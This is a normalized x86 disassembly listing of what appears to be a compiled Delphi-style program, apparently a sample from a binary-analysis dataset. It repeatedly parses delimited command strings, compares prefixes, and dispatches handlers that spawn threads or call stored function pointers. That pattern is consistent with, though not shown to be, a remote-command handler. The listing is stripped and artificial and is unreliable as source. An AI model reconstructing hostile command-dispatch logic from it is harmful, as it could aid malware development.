mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4878a4
push ebp
lea eax [ ebp - 0x708 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_409edc
mov ecx [ ebp - 0xc ]
mov edx 0x1
call sub_48cc9c
mov eax [ ebp - 0x708 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_475fd8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x710 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x710 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_48768c
lea eax [ ebp - 0x714 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x714 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_487488
lea eax [ ebp - 0x718 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x718 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x4
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push 0x14
push 0x40
call LocalAlloc
mov esi eax
mov ebx esi
mov eax [ ebp - 0xc ]
call sub_409edc
mov [ ebx ] eax
mov eax [ ebp - 0x10 ]
call sub_4839ec
mov [ ebx + 0x4 ] eax
mov eax [ ebp - 0x14 ]
call sub_4839ec
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x18 ]
call sub_4839ec
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
mov edx [ ebp - 0x1c ]
call sub_405584
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push esi
push r-xdata
push 0x0
push 0x0
call CreateThread
push eax
call CloseHandle
lea eax [ ebp - 0x71c ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x71c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_4807d8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_480758
mov eax ebx
call sub_41fef0
lea eax [ ebp - 0x720 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x720 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_462078
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_4620f4
mov edx r-xdata
mov eax ebx
call sub_4620f8
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x724 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x724 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x6
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_480074
mov eax ebx
call sub_41fef0
xor edx edx
mov eax ebx
call sub_4620f0
mov dl 0x1
mov eax ebx
call sub_4620f0
jmp r-xdata
lea eax [ ebp - 0x728 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x728 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_480cf4
mov eax ebx
call sub_41fef0
mov eax ebx
call sub_41fef0
lea eax [ ebp - 0x72c ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x72c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0xf ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x5
call sub_41fc40
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
call sub_462078
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4620f4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_4620f8
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x730 ]
push eax
mov ecx 0x11
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x730 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4620f0
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_4620f0
jmp r-xdata
lea eax [ ebp - 0x734 ]
push eax
mov ecx 0xf
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x734 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x11
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41fef0
lea eax [ ebp - 0x738 ]
push eax
mov ecx 0xf
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x738 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xf
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0xf ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x5
call sub_41fc40
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_4898f8
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_489944
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41fef0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_489948
test al al
je r-xdata
lea eax [ ebp - 0x73c ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x73c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_489948
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
lea eax [ ebp - 0x740 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x740 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x1c ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x20 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x24 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0xf ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x5
call sub_41fc40
mov eax [ ebp - 0x28 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_488294
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_488298
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x24 ]
call sub_4882ac
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4882f8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
call sub_4883dc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x14 ]
call sub_48830c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x20 ]
call sub_488374
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
call sub_488444
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41fef0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_489948
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
call sub_489864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x744 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x744 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0xf ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x5
call sub_41fc40
mov eax [ ebp - 0x14 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_487e04
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_487e00
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_487dfc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41fef0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4884ac
test al al
je r-xdata
lea eax [ ebp - 0x748 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x748 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
lea eax [ ebp - 0x74c ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x74c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_47fda0
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_47fda4
mov eax [ ebp - 0x14 ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_47fda8
mov eax ebx
call sub_41fef0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_487e18
test al al
je r-xdata
lea eax [ ebp - 0x754 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x754 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x750 ]
call sub_474638
mov eax [ ebp - 0x750 ]
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_475fd8
pop ecx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
lea eax [ ebp - 0x758 ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x758 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0xf ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x5
call sub_41fc40
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_486308
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_486304
mov eax [ ebp - 0x14 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_486300
mov eax [ ebp - 0x18 ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4862fc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41fef0
lea eax [ ebp - 0x75c ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x75c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x764 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x764 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea eax [ ebp - 0x760 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_405a44
mov eax [ ebp - 0x760 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_48630c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov eax [ ebp - 0x10 ]
call sub_409edc
mov edx eax
mov eax ebx
call sub_47f9d8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_47f9dc
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_47f988
xor edx edx
mov eax ebx
call sub_47f9d4
mov eax ebx
call sub_41fef0
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4055c8
lea eax [ ebp - 0x18 ]
mov ecx 0x6
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x768 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x768 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
mov eax [ ebp - 0x10 ]
call sub_409edc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x76c ]
push eax
